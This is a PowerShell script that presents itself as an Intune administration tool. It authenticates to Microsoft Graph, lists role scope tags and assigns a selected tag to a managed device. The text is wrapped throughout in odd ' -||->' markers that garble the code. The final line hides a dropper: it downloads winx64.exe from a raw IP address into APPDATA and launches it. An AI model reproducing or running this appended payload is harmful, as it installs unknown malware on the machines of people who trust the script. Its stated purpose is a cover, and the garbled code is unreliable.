



 -||-> function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

 -||-> $userUpn =  -||-> New-Object "System.Net.Mail.MailAddress" -ArgumentList $User <-||-  <-||- 

 -||-> $tenant = $userUpn.Host <-||- 

 -||-> Write-Host "Checking for AzureAD module..." <-||- 

     -||-> $AadModule =  -||-> Get-Module -Name "AzureAD" -ListAvailable <-||-  <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {

         -||-> Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview" <-||- 
         -||-> $AadModule =  -||-> Get-Module -Name "AzureADPreview" -ListAvailable <-||-  <-||- 

    } <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {
         -||-> write-host <-||- 
         -||-> write-host "AzureAD Powershell module not installed..." -f Red <-||- 
         -||-> write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow <-||- 
         -||-> write-host "Script can't continue..." -f Red <-||- 
         -||-> write-host <-||- 
        exit
    } <-||- 




     -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

         -||-> $Latest_Version = ( -||-> $AadModule | select version | Sort-Object <-||- )[-1] <-||- 

         -||-> $aadModule =  -||-> $AadModule | ? {  -||-> $_.version -eq $Latest_Version.version <-||-  } <-||-  <-||- 

            

             -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

             -||-> $aadModule =  -||-> $AadModule | select -Unique <-||-  <-||- 

            } <-||- 

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    }

    else {

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    } <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adal) | Out-Null <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null <-||- 

 -||-> $clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547" <-||- 

 -||-> $redirectUri = "urn:ietf:wg:oauth:2.0:oob" <-||- 

 -||-> $resourceAppIdURI = "https://graph.microsoft.com" <-||- 

 -||-> $authority = "https://login.microsoftonline.com/$Tenant" <-||- 

     -||-> try {

     -||-> $authContext =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority <-||-  <-||- 

    
    

     -||-> $platformParameters =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto" <-||-  <-||- 

     -||-> $userId =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ( -||-> $User, "OptionalDisplayableId" <-||- ) <-||-  <-||- 

     -||-> $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result <-||- 

        

         -||-> if( -||-> $authResult.AccessToken <-||- ){

        

         -||-> $authHeader = @{
            'Content-Type'= -||-> 'application/json' <-||- 
            'Authorization'= -||-> "Bearer " + $authResult.AccessToken <-||- 
            'ExpiresOn'= -||-> $authResult.ExpiresOn <-||- 
            } <-||- 

        return  -||-> $authHeader <-||- 

        }

        else {

         -||-> Write-Host <-||- 
         -||-> Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 
        break

        } <-||- 

    }

    catch {

     -||-> write-host $_.Exception.Message -f Red <-||- 
     -||-> write-host $_.Exception.ItemName -f Red <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Get-RBACScopeTag(){



[cmdletbinding()]
    
param
(
    [Parameter(Mandatory=$false)]
    $DisplayName
)


 -||-> $graphApiVersion = "beta" <-||- 
 -||-> $Resource = "deviceManagement/roleScopeTags" <-||- 

     -||-> try {

         -||-> if( -||-> $DisplayName <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=displayName eq '$DisplayName'" <-||- 
             -||-> $Result = ( -||-> Invoke-RestMethod -Uri $uri -Method Get -Headers $authToken <-||- ).Value <-||- 

        }

        else {

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource" <-||- 
             -||-> $Result = ( -||-> Invoke-RestMethod -Uri $uri -Method Get -Headers $authToken <-||- ).Value <-||- 

        } <-||- 

    return  -||-> $Result <-||- 

    }

    catch {
    
     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    throw
    } <-||- 

} <-||- 



 -||-> Function Get-ManagedDevices(){



[cmdletbinding()]

param
(
    [switch]$IncludeEAS,
    [switch]$ExcludeMDM,
    $DeviceName,
    $id
)


 -||-> $graphApiVersion = "beta" <-||- 
 -||-> $Resource = "deviceManagement/managedDevices" <-||- 

 -||-> try {

     -||-> $Count_Params = 0 <-||- 

     -||-> if( -||-> $IncludeEAS.IsPresent <-||- ){  -||-> $Count_Params++ <-||-  } <-||- 
     -||-> if( -||-> $ExcludeMDM.IsPresent <-||- ){  -||-> $Count_Params++ <-||-  } <-||- 
     -||-> if( -||-> $DeviceName.IsPresent <-||- ){  -||-> $Count_Params++ <-||-  } <-||- 
     -||-> if( -||-> $id.IsPresent <-||- ){  -||-> $Count_Params++ <-||-  } <-||- 
        
         -||-> if( -||-> $Count_Params -gt 1 <-||- ){

             -||-> write-warning "Multiple parameters set, specify a single parameter -IncludeEAS, -ExcludeMDM, -deviceName, -id or no parameter against the function" <-||- 
             -||-> Write-Host <-||- 
            break

        }
        
        elseif( -||-> $IncludeEAS <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 

        }

        elseif( -||-> $ExcludeMDM <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=managementAgent eq 'eas'" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 

        }

        elseif( -||-> $id <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource('$id')" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ) <-||- 

        }

        elseif( -||-> $DeviceName <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=deviceName eq '$DeviceName'" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 

        }
        
        else {
    
             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=managementAgent eq 'mdm' and managementAgent eq 'easmdm'" <-||- 
             -||-> Write-Warning "EAS Devices are excluded by default, please use -IncludeEAS if you want to include those devices" <-||- 
             -||-> Write-Host <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get <-||- ).Value <-||- 

        } <-||- 
    
    }

    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Update-ManagedDevices(){



[cmdletbinding()]

param
(
    $id,
    $ScopeTags
)

 -||-> $graphApiVersion = "beta" <-||- 
 -||-> $Resource = "deviceManagement/managedDevices('$id')" <-||- 

     -||-> try {

         -||-> if( -||-> $ScopeTags -eq "" -or $ScopeTags -eq $null <-||- ){

 -||-> $JSON = @"

{
  "roleScopeTagIds": []
}

"@ <-||- 
        }

        else {

             -||-> $object =  -||-> New-Object –TypeName PSObject <-||-  <-||- 
             -||-> $object | Add-Member -MemberType NoteProperty -Name 'roleScopeTagIds' -Value @( -||-> $ScopeTags <-||- ) <-||- 
             -||-> $JSON =  -||-> $object | ConvertTo-Json <-||-  <-||- 

        } <-||- 

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Resource <-||- )" <-||- 
         -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Patch -Body $JSON -ContentType "application/json" <-||- 

         -||-> Start-Sleep -Milliseconds 100 <-||- 

    }

    catch {

     -||-> Write-Host <-||- 
     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 






 -||-> if( -||-> $global:authToken <-||- ){

    
     -||-> $DateTime = ( -||-> Get-Date <-||- ).ToUniversalTime() <-||- 

    
     -||-> $TokenExpires = ( -||-> $authToken.ExpiresOn.datetime - $DateTime <-||- ).Minutes <-||- 

         -||-> if( -||-> $TokenExpires -le 0 <-||- ){

         -||-> write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow <-||- 
         -||-> write-host <-||- 

            

             -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

             -||-> $Global:User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
             -||-> Write-Host <-||- 

            } <-||- 

         -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

        } <-||- 
}



else {

     -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

     -||-> Write-Host <-||- 
     -||-> $Global:User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
     -||-> Write-Host <-||- 

    } <-||- 


 -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

} <-||- 







 -||-> Write-Host <-||- 

 -||-> $ScopeTags =  -||-> ( -||-> Get-RBACScopeTag <-||- ).displayName | sort <-||-  <-||- 

 -||-> if( -||-> $ScopeTags <-||- ){

 -||-> Write-Host "Please specify Scope Tag you want to assign:" -ForegroundColor Yellow <-||- 

 -||-> $menu = @{} <-||- 

for ( -||-> $i=1 <-||- ; -||-> $i -le $ScopeTags.count <-||- ;  -||-> $i++ <-||- ) 
{  -||-> Write-Host "$i. $( -||-> $ScopeTags[$i-1] <-||- )" <-||-  
 -||-> $menu.Add($i,( -||-> $ScopeTags[$i-1] <-||- )) <-||- }

 -||-> Write-Host <-||- 
 -||-> $ans =  -||-> Read-Host 'Enter Scope Tag id (Numerical value)' <-||-  <-||- 

 -||-> if( -||-> $ans -eq "" -or $ans -eq $null <-||- ){

     -||-> Write-Host "Scope Tag can't be null, please specify a valid Scope Tag..." -ForegroundColor Red <-||- 
     -||-> Write-Host <-||- 
    break

}

elseif( -||-> ( -||-> $ans -match "^[\d\.]+$" <-||- ) -eq $true <-||- ){

 -||-> $selection = $menu.Item([int]$ans) <-||- 

     -||-> if( -||-> $selection <-||- ){

         -||-> $ScopeTagId = ( -||-> Get-RBACScopeTag | ? {  -||-> $_.displayName -eq "$selection" <-||-  } <-||- ).id <-||- 

    }

    else {

         -||-> Write-Host "Scope Tag selection invalid, please specify a valid Scope Tag..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 
        break

    } <-||- 

}

else {

     -||-> Write-Host "Scope Tag not an integer, please specify a valid scope tag..." -ForegroundColor Red <-||- 
     -||-> Write-Host <-||- 
    break

} <-||- 

 -||-> Write-Host <-||- 

}

else {

     -||-> Write-Host "No Scope Tags created, script can't continue..." -ForegroundColor Red <-||- 
     -||-> Write-Host <-||- 
    break

} <-||- 





 -||-> $DeviceName = "Intune Device Name" <-||- 

 -||-> $IntuneDevice =  -||-> Get-ManagedDevices -DeviceName "$DeviceName" <-||-  <-||- 

 -||-> if( -||-> $IntuneDevice <-||- ){

     -||-> if( -||-> @( -||-> $IntuneDevice <-||- ).count -eq 1 <-||- ){

     -||-> $MD =  -||-> Get-ManagedDevices -id $IntuneDevice.id <-||-  <-||- 

     -||-> write-host "Are you sure you want to add scope tag '$selection' to '$DeviceName' (Y or N?)" -ForegroundColor Yellow <-||- 
     -||-> $Confirm =  -||-> read-host <-||-  <-||- 

         -||-> if( -||-> $Confirm -eq "y" -or $Confirm -eq "Y" <-||- ){

         -||-> if( -||-> $MD.roleScopeTagIds <-||- ){

             -||-> if( -||-> !( -||-> $MD.roleScopeTagIds <-||- ).contains("$ScopeTagId") <-||- ){

                 -||-> $ST = @( -||-> $MD.roleScopeTagIds <-||- ) + @( -||-> "$ScopeTagId" <-||- ) <-||- 

                 -||-> $Result =  -||-> Update-ManagedDevices -id $MD.id -ScopeTags $ST <-||-  <-||- 

                 -||-> if( -||-> $Result -eq "" <-||- ){

                     -||-> Write-Host "Managed Device '$DeviceName' patched with ScopeTag '$selection'..." -ForegroundColor Green <-||- 
                            
                } <-||- 

            }

            else {

                 -||-> Write-Host "Scope Tag '$selection' already assigned to '$DeviceName'..." -ForegroundColor Magenta <-||- 

            } <-||- 

        }

        else {

             -||-> $ST = @( -||-> "$ScopeTagId" <-||- ) <-||- 

             -||-> $Result =  -||-> Update-ManagedDevices -id $MD.id -ScopeTags $ST <-||-  <-||- 

             -||-> if( -||-> $Result -eq "" <-||- ){

                 -||-> Write-Host "Managed Device '$DeviceName' patched with ScopeTag '$selection'..." -ForegroundColor Green <-||- 

            } <-||- 

        } <-||- 

        }

        else {

             -||-> Write-Host "Addition of Scope Tag '$selection' to '$DeviceName' was cancelled..." <-||- 

        } <-||- 

    }

    elseif( -||-> @( -||-> $IntuneManagedDevice <-||- ).count -gt 1 <-||- ){

         -||-> Write-Host "More than one device found with name '$deviceName'..." -ForegroundColor Red <-||- 

    } <-||- 

}

else {

     -||-> Write-Host "No Intune Managed Device found with name '$deviceName'..." -ForegroundColor Red <-||- 

} <-||- 

 -||-> Write-Host <-||- 




 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\winx64.exe" <-||- ) <-||- 



